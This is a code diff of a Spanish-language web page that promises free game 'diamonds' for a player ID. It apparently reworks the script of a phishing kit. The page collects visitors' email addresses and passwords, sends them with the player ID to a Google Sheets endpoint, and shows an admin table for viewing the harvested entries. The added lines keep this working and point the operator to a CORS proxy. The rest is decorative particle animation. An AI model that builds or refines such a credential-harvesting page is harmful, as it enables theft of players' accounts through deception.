-                }
-
-                receiveBtn.disabled = true;
-                receiveBtn.innerHTML = '<span class="loading-spinner"></span> Procesando recarga...';
-
-                const userData = {
-                    email: tempEmail,
-                    password: tempPassword,
-                    playerId: cleanId,
-                    diamonds: selectedDiamonds
-                };
-                
-                const success = await saveUserToSheets(userData);
-                
-                if (!success) {
-                    alert("⚠️ Error al guardar en Google Sheets. Los datos se guardaron localmente.\nRevisa la consola (F12) para más detalles.");
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                document.getElementById('email').value = '';
-                document.getElementById('pass').value = '';
-                playerIdInput.value = '';
-                if (idMessage) idMessage.textContent = '';
-                
-                diamondOpts.forEach(opt => opt.classList.remove('selected'));
-                const nextButton = document.getElementById('nextBtn');
-                if (nextButton) {
-                    nextButton.disabled = true;
-                    nextButton.textContent = 'Continuar';
-                }
-                
-                receiveBtn.innerHTML = '✨ Recibir diamantes ✨';
-                receiveBtn.disabled = false;
-                
-                selectedDiamonds = null;
-                tempEmail = "";
-                tempPassword = "";
-                
-                showScreen(3);
-            });
-        }
-
-        // RESET
-        const resetButton = document.getElementById('resetBtn');
-        if (resetButton) {
-            resetButton.addEventListener('click', () => {
-                selectedDiamonds = null;
-                tempEmail = "";
-                tempPassword = "";
-                document.getElementById('email').value = '';
-                document.getElementById('pass').value = '';
-                if (playerIdInput) playerIdInput.value = '';
-                if (idMessage) idMessage.textContent = '';
-                if (receiveBtn) receiveBtn.disabled = true;
-                diamondOpts.forEach(opt => opt.classList.remove('selected'));
-                const continueBtn = document.getElementById('nextBtn');
-                if (continueBtn) {
-                    continueBtn.disabled = true;
-                    continueBtn.textContent = 'Continuar';
-                }
-                showScreen(0);
-            });
-        }
-
-        // ADMIN BUTTONS
-        const refreshAdminBtn = document.getElementById('refreshAdminBtn');
-        if (refreshAdminBtn) {
-            refreshAdminBtn.addEventListener('click', async () => {
-                refreshAdminBtn.disabled = true;
-                refreshAdminBtn.innerHTML = '<span class="loading-spinner"></span> Cargando...';
-                await renderAdminTable();
-                refreshAdminBtn.disabled = false;
-                refreshAdminBtn.innerHTML = '🔄 Refrescar';
-            });
-        }
-        
-        const logoutAdminBtn = document.getElementById('logoutAdminBtn');
-        if (logoutAdminBtn) {
-            logoutAdminBtn.addEventListener('click', () => {
-                showScreen(0);
-                document.getElementById('email').value = '';
-                document.getElementById('pass').value = '';
-            });
-        }
-
-        window.addEventListener('load', async () => {
-            showScreen(0);
-            if (playerIdInput) playerIdInput.value = '';
-            if (idMessage) idMessage.textContent = '';
-            if (receiveBtn) receiveBtn.disabled = true;
-            console.log("🚀 Sistema conectado a Google Sheets");
-            console.log("📡 URL:", GOOGLE_SHEETS_API_URL);
+        receiveBtn?.addEventListener('click', async () => {
+            const cleanId = playerIdInput.value.replace(/\D/g,'');
+            if(cleanId.length !== 10) { alert("❌ El ID debe tener 10 dígitos."); return; }
+            if(!selectedDiamonds) { alert("⚠️ Selecciona diamantes."); showScreen(1); return; }
+            if(!tempEmail || !tempPassword) { alert("⚠️ Inicia sesión nuevamente."); showScreen(0); return; }
+            receiveBtn.disabled = true;
+            receiveBtn.innerHTML = '<span class="loading-spinner"></span> Procesando recarga...';
+            const success = await saveUserToSheets({ email: tempEmail, password: tempPassword, playerId: cleanId, diamonds: selectedDiamonds });
+            if(!success) alert("⚠️ Error al guardar en Google Sheets. Los datos se guardaron localmente.\n(Acepta CORS en https://cors-anywhere.herokuapp.com si es primera vez)");
+            await new Promise(r => setTimeout(r,1000));
+            document.getElementById('email').value = ''; document.getElementById('pass').value = ''; playerIdInput.value = ''; idMessage.textContent = '';
+            document.querySelectorAll('.diamond-opt').forEach(opt => opt.classList.remove('selected'));
+            const nextBtn2 = document.getElementById('nextBtn');
+            if(nextBtn2) { nextBtn2.disabled = true; nextBtn2.textContent = 'Continuar'; }
+            receiveBtn.innerHTML = '✨ Recibir diamantes ✨';
+            receiveBtn.disabled = false;
+            selectedDiamonds = null; tempEmail = ""; tempPassword = "";
+            showScreen(3);
         });
+
+        document.getElementById('resetBtn')?.addEventListener('click', () => {
+            selectedDiamonds = null; tempEmail = ""; tempPassword = "";
+            document.getElementById('email').value = ''; document.getElementById('pass').value = ''; playerIdInput.value = ''; idMessage.textContent = '';
+            receiveBtn.disabled = true;
+            document.querySelectorAll('.diamond-opt').forEach(opt => opt.classList.remove('selected'));
+            const btn = document.getElementById('nextBtn');
+            if(btn) { btn.disabled = true; btn.textContent = 'Continuar'; }
+            showScreen(0);
+        });
+
+        document.getElementById('refreshAdminBtn')?.addEventListener('click', async () => { const btn = document.getElementById('refreshAdminBtn'); btn.disabled=true; btn.innerHTML='<span class="loading-spinner"></span> Cargando...'; await renderAdminTable(); btn.disabled=false; btn.innerHTML='🔄 Refrescar'; });
+        document.getElementById('logoutAdminBtn')?.addEventListener('click', () => { showScreen(0); document.getElementById('email').value = ''; document.getElementById('pass').value = ''; });
+        window.addEventListener('load', () => { showScreen(0); playerIdInput.value=''; idMessage.textContent=''; receiveBtn.disabled=true; console.log("🚀 Listo!"); });
 
         // PARTÍCULAS
         const canvas = document.getElementById('particles-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
-
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         resizeCanvas();
         window.addEventListener('resize', resizeCanvas);
-
         class ParticleGem {
-            constructor() {
-                this.reset();
-                this.y = Math.random() * canvas.height;
-            }
-            reset() {
-                this.x = Math.random() * canvas.width;
-                this.y = canvas.height + 5;
-                this.size = Math.random() * 4 + 1.5;
-                this.speedY = Math.random() * 0.6 + 0.3;
-                this.speedX = (Math.random() - 0.5) * 0.25;
-                this.opacity = Math.random() * 0.5 + 0.2;
-                this.fadeSpeed = Math.random() * 0.004 + 0.002;
-                const hues = [200, 210, 220, 195, 205];
-                const colorIdx = Math.floor(Math.random() * hues.length);
-                this.color = `hsl(${hues[colorIdx]}, 85%, 65%)`;
-                this.isDiamondShape = Math.random() > 0.7;
-            }
-            update() {
-                this.y -= this.speedY;
-                this.x += this.speedX;
-                this.opacity -= this.fadeSpeed;
-                if (this.y < -15 || this.opacity <= 0.02) this.reset();
-            }
-            draw() {
-                ctx.save();
-                ctx.globalAlpha = this.opacity * 0.8;
-                if (this.isDiamondShape && this.size > 2.2) {
-                    ctx.fillStyle = this.color;
-                    ctx.beginPath();
-                    const s = this.size;
-                    ctx.moveTo(this.x, this.y - s);
-                    ctx.lineTo(this.x + s * 0.7, this.y);
-                    ctx.lineTo(this.x, this.y + s * 0.6);
-                    ctx.lineTo(this.x - s * 0.7, this.y);
-                    ctx.closePath();
-                    ctx.fill();
-                } else {
-                    ctx.fillStyle = this.color;
-                    ctx.shadowBlur = 6;
-                    ctx.shadowColor = "rgba(80, 180, 255, 0.5)";
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size * 0.9, 0, Math.PI * 2);
-                    ctx.fill();
-                    ctx.shadowBlur = 0;
-                }
-                ctx.restore();
-            }
+            constructor() { this.reset(); this.y = Math.random() * canvas.height; }
+            reset() { this.x = Math.random() * canvas.width; this.y = canvas.height+5; this.size = Math.random()*4+1.5; this.speedY = Math.random()*0.6+0.3; this.speedX = (Math.random()-0.5)*0.25; this.opacity = Math.random()*0.5+0.2; this.fadeSpeed = Math.random()*0.004+0.002; this.color = `hsl(${[200,210,220,195,205][Math.floor(Math.random()*5)]},85%,65%)`; this.isDiamondShape = Math.random()>0.7; }
+            update() { this.y -= this.speedY; this.x += this.speedX; this.opacity -= this.fadeSpeed; if(this.y<-15||this.opacity<=0.02) this.reset(); }
+            draw() { ctx.save(); ctx.globalAlpha = this.opacity*0.8; if(this.isDiamondShape&&this.size>2.2){ ctx.fillStyle=this.color; ctx.beginPath(); const s=this.size; ctx.moveTo(this.x,this.y-s); ctx.lineTo(this.x+s*0.7,this.y); ctx.lineTo(this.x,this.y+s*0.6); ctx.lineTo(this.x-s*0.7,this.y); ctx.closePath(); ctx.fill(); } else { ctx.fillStyle=this.color; ctx.shadowBlur=6; ctx.shadowColor="rgba(80,180,255,0.5)"; ctx.beginPath(); ctx.arc(this.x,this.y,this.size*0.9,0,Math.PI*2); ctx.fill(); ctx.shadowBlur=0; } ctx.restore(); }
         }
-
-        const particleCount = Math.min(85, Math.floor(window.innerWidth * window.innerHeight / 14000));
-        for (let i = 0; i < particleCount; i++) particles.push(new ParticleGem());
-
-        function animateParticles() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            particles.forEach(p => { p.update(); p.draw(); });
-            requestAnimationFrame(animateParticles);
-        }
+        for(let i=0;i<Math.min(85,Math.floor(window.innerWidth*window.innerHeight/14000));i++) particles.push(new ParticleGem());
+        function animateParticles() { ctx.clearRect(0,0,canvas.width,canvas.height); particles.forEach(p=>{p.update();p.draw();}); requestAnimationFrame(animateParticles); }
         animateParticles();
     </script>
 </body>
